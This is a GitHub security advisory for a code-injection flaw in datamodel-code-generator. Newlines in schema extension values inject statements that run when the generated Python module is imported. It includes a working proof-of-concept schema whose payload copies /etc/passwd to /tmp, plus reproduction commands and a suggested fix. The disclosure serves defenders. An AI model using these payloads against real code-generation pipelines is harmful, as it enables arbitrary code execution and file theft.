# [H] datamodel-code-generator vulnerable to code injection via `x-python-import` / `customTypePath` in generated import statements

## Summary
Severity: High
Advisory: GHSA-5578-w22f-pfx9
CVE: CVE-2026-55415
CWE: CWE-94, CWE-95
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-28
Source: https://github.com/advisories/GHSA-5578-w22f-pfx9
Type: github-advisory

## Affected
- PyPI: `datamodel-code-generator` — affected >=0.11.6 <0.64.0

## Details
#### Summary

A malicious input schema (OpenAPI / JSON Schema) can execute arbitrary Python code on the machine that **imports** the generated model. The `x-python-import` and `customTypePath` schema extensions flow, unsanitized, into the `import` statements datamodel-code-generator emits. A newline embedded in the extension value breaks out of the `from … import …` line and injects an attacker-controlled statement at module scope, which runs at import time. This is an unauthenticated, schema-content–driven remote code execution against any consumer of the generated code (e.g. arbitrary file read,the PoC exfiltrates `/etc/passwd`). It survives the v0.61.0 security release that fixed the related `x-python-type`, `default_factory`, GraphQL-union-description, and `validators` sinks  those fixes did not cover this sibling path.

#### Details

The sink is `Import.from_full_path` and `Imports.create_line`:

- `src/datamodel_code_generator/imports.py:35` — `from_full_path()` only does `class_path.split(".")` and preserves every other character, **including newlines**:
  ```python
  @classmethod
  @lru_cache
  def from_full_path(cls, class_path: str) -> Import:
      split_class_path: list[str] = class_path.split(".")
      return cls(import_=split_class_path[-1], from_=".".join(split_class_path[:-1]) or None)
  ```
- `src/datamodel_code_generator/imports.py:64` — `create_line()` renders the result verbatim:
  ```python
  def create_line(self, from_: str | None, imports: set[str]) -> str:
      if from_:
          return f"from {from_} import {', '.join(self._set_alias(from_, imports))}"
      return "\n".join(f"import {i}" for i in self._set_alias(from_, imports))
  ```

There is no check that the path segments are Python identifiers, contrast `validators._validate_dotted_python_identifier_path`, which the same v0.61.0 release added for the `validators` config, and `types.is_python_type_annotation`, added for `x-python-type`. The two extensions below were left unguarded.

Two schema-controlled, **default-config** entry points reach this sink:

1. **`x-python-import`** — `src/datamodel_code_generator/parser/jsonschema.py:1851-1858` (`get_ref_data_type`):
   ```python
   x_python_import = ref_schema.extras.get("x-python-import")
   if isinstance(x_python_import, dict):
       module = x_python_import.get("module")
       type_name = x_python_import.get("name")
       if module and type_name:
           full_path = f"{module}.{type_name}"
           import_ = Import.from_full_path(full_path)
           self.imports.append(import_)
   ```
2. **`customTypePath`** — declared at `src/datamodel_code_generator/parser/jsonschema.py:438`, consumed at `:4118` and `:4365` via `get_data_type_from_full_path(custom_type_path, is_custom_type=True)` → the same `Import.from_full_path` sink.

**Mechanism.** With `name = "getcwd\nprint(...)"`, `full_path = "os.getcwd\nprint(...)"`. `from_full_path` splits only on `.`, so (provided the injected statement contains no `.`) it yields `from_="os"` and `import_="getcwd\nprint(...)"`. `create_line` then emits:
```python
from os import getcwd
print(...)        # ← attacker statement at module scope, executes on import
```
The dot-split is the only constraint on the payload; it is trivially satisfied with attribute-free builtins (e.g. `print(*open('/etc/passwd'), file=open('/tmp/loot','w'), sep='', end='')` reads and exfiltrates a file using no `.`).

None of the six v0.61.0 fix commits (`aec47bc4`, `b73abb5c`, `17fc235e`, `2c93c9b7`, `a43d0290`, `5fdba4a0`) touched `x-python-import`, `customTypePath`, or `imports.py`; `imports.py` was last modified ~5 months before the release. This is therefore an **incomplete fix**: the maintainer hardened sibling schema-controlled type/extension sinks but missed these two paths into the same import-generation code.

#### PoC
Self contained POC available here: https://gist.github.com/thegr1ffyn/c3abb41bb89c164daa0d5f2c60b5328b

Default invocation, no special flags, on the patched release (commit `227ffe85ee2dcfc79336fbb14ad64c02a166b65a`, v0.61.0).

`payload_a.json`:
```json
{
  "type": "object",
  "title": "Root",
  "required": ["f"],
  "properties": { "f": { "$ref": "#/$defs/Evil" } },
  "$defs": {
    "Evil": {
      "type": "object",
      "x-python-import": {
        "module": "os",
        "name": "getcwd\nprint(*open('/etc/passwd'),file=open('/tmp/dmcg_xpi_loot','w'),sep='',end='')"
      }
    }
  }
}
```
Generate and import:
```bash
datamodel-codegen --input payload_a.json --input-file-type jsonschema --output model.py
python -c "import model"
```
Generated `model.py` (verbatim, the breakout sits at module scope):
```python
from __future__ import annotations

from os import getcwd

print(*open('/etc/passwd'), file=open('/tmp/dmcg_xpi_loot', 'w'), sep='', end='')
from os import getcwd

print(*open('/etc/passwd'), file=open('/tmp/dmcg_xpi_loot', 'w'), sep='', end='')
from pydantic import BaseModel
...
```
Importing `model` reads `/etc/passwd` and writes an exact copy to `/tmp/dmcg_xpi_loot`:
```
$ head -1 /tmp/dmcg_xpi_loot
root:x:0:0:root:/root:/bin/bash
```
Confirmed under both the default output (pydantic v1) and `--output-model-type pydantic_v2.BaseModel`. The `customTypePath` variant reproduces identically:
```json
{ "type":"object","title":"Root","required":["f"],
  "properties":{ "f":{ "type":"object",
    "customTypePath":"os.getcwd\nprint(*open('/etc/passwd'),file=open('/tmp/dmcg_ctp_loot','w'),sep='',end='')" }}}
```
A benign control (`x-python-import: {"module":"decimal","name":"Decimal"}`) produces clean `from decimal import Decimal` and no execution. A complete self-contained validation harness, `run.sh` plus `control.json`, `payload_a.json`, `payload_b.json`, is included alongside this advisory (CONTROL clean + three payloads firing + verdict + cleanup).

**Suggested fix.** Validate every dotted segment of `module`, `name`, and `customTypePath` as a Python identifier before building the import (reuse `validators._validate_dotted_python_identifier_path`), and/or reject non-identifier paths centrally inside `Import.from_full_path`.

#### Impact

Arbitrary code execution at model-import time, driven by attacker-controlled schema content under the default configuration. Anyone who runs datamodel-code-generator on an untrusted or third-party schema, multi-tenant code-generation services, CI pipelines that ingest external specs, or a developer generating models from a public/vendor OpenAPI/JSON-Schema document, and then imports (or whose tooling imports) the generated module, executes the attacker's code with the importing process's privileges. The PoC demonstrates arbitrary local file read (`/etc/passwd`); the same primitive yields full RCE.

### Maintainer status

Confirmed by maintainer review and regression tests. A private fix PR is open and should be merged before publishing this advisory: https://github.com/koxudaxi/datamodel-code-generator-ghsa-5578-w22f-pfx9/pull/1

Fix summary: validate `x-python-import` and `customTypePath` values as dotted Python identifier paths before using them in generated imports or type paths.

Release status: not fixed in `0.63.0`; `customTypePath` was introduced in `0.11.6`, so affected versions are `>= 0.11.6, <= 0.63.0`. This advisory should remain unpublished until the private PR is merged and a patched release is available.

Validation: `uv run --group test --extra http pytest tests/main/jsonschema/test_main_jsonschema.py tests/parser/test_jsonschema.py` passed locally; `uv run --group fix ruff check src/datamodel_code_generator/parser/jsonschema.py tests/main/jsonschema/test_main_jsonschema.py` passed.

Submitted by: Hamza Haroon (thegr1ffyn)

## References
- https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-5578-w22f-pfx9
- https://github.com/koxudaxi/datamodel-code-generator/commit/577d49569c2254c371a97e495020ae2238a73b84
- https://github.com/koxudaxi/datamodel-code-generator
- https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.64.0
